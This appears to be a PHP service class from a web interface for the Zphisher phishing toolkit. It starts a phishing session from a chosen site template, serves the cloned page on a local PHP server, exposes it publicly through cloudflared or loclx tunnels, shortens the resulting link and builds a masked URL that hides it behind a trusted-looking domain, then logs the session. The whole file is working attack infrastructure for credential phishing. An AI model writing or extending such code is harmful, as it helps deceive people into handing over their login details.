<?php
declare(strict_types=1);

final class SessionService
{
    public static function getActive(): ?array
    {
        return Store::getActiveSession();
    }

    public static function start(array $params): array
    {
        self::stop();

        $templateId = (string) ($params['template_id'] ?? '');
        $tunnel = (string) ($params['tunnel'] ?? 'localhost');
        $host = (string) ($params['host'] ?? DEFAULT_PHISH_HOST);
        $port = (int) ($params['port'] ?? DEFAULT_PHISH_PORT);
        $useMask = !empty($params['use_mask']);
        $customMask = trim((string) ($params['mask_url'] ?? ''));
        $loclxRegion = (string) ($params['loclx_region'] ?? 'us');
        $loclxToken = isset($params['loclx_token']) ? (string) $params['loclx_token'] : null;

        if ($port < 1024 || $port > 9999) {
            return ['ok' => false, 'error' => 'Port must be between 1024 and 9999'];
        }
        putenv('ZPHISHER_LAST_PORT=' . $port);

        $tpl = TemplateCatalog::find($templateId);
        if (!$tpl) {
            return ['ok' => false, 'error' => 'Invalid template'];
        }

        $setup = ServerManager::setupSite($templateId);
        if (!$setup['ok']) {
            return $setup;
        }

        $phpStart = ServerManager::startPhpServer($host, $port);
        if (!$phpStart['ok']) {
            return $phpStart;
        }

        $primaryUrl = $phpStart['url'];
        $tunnelUrl = null;

        if ($tunnel === 'cloudflared') {
            $t = TunnelManager::startCloudflared($host, $port);
            if (!$t['ok']) {
                ServerManager::stopAll();
                return $t;
            }
            $tunnelUrl = $t['tunnel_url'];
            $primaryUrl = $tunnelUrl;
        } elseif ($tunnel === 'loclx') {
            $t = TunnelManager::startLoclx($host, $port, $loclxRegion, $loclxToken);
            if (!$t['ok']) {
                ServerManager::stopAll();
                return $t;
            }
            $tunnelUrl = $t['tunnel_url'];
            $primaryUrl = $tunnelUrl;
        }

        $mask = $customMask !== '' ? $customMask : (string) $tpl['mask'];
        if ($useMask && $customMask === '') {
            $mask = (string) $tpl['mask'];
        }

        $shortUrl = null;
        $maskedUrl = null;
        if ($tunnelUrl && preg_match('#(trycloudflare\.com|loclx\.io)#i', $tunnelUrl)) {
            $shortUrl = UrlShortener::shorten($tunnelUrl);
            if ($useMask && $shortUrl) {
                $maskedUrl = UrlShortener::buildMasked($mask, $shortUrl);
            }
        }

        $label = ($tpl['group'] ?? '') . ' — ' . ($tpl['label'] ?? $templateId);
        $sessionId = Store::insertSession([
            'template_id' => $templateId,
            'template_label' => $label,
            'tunnel' => $tunnel,
            'host' => $host,
            'port' => $port,
            'mask_url' => $useMask ? $mask : null,
            'primary_url' => $primaryUrl,
            'short_url' => $shortUrl,
            'masked_url' => $maskedUrl,
            'started_at' => gmdate('c'),
        ]);

        return [
            'ok' => true,
            'session' => [
                'id' => $sessionId,
                'template_id' => $templateId,
                'template_label' => $label,
                'tunnel' => $tunnel,
                'host' => $host,
                'port' => $port,
                'local_url' => $phpStart['url'],
                'primary_url' => $primaryUrl,
                'tunnel_url' => $tunnelUrl,
                'short_url' => $shortUrl,
                'masked_url' => $maskedUrl,
                'status' => 'running',
            ],
        ];
    }

    public static function stop(): array
    {
        $active = self::getActive();
        if ($active) {
            putenv('ZPHISHER_LAST_PORT=' . (int) $active['port']);
        }
        ServerManager::stopAll();
        Store::stopAllSessions();
        return ['ok' => true];
    }

    /** @return list<array<string, mixed>> */
    public static function history(int $limit = 20): array
    {
        return Store::sessionHistory($limit);
    }
}
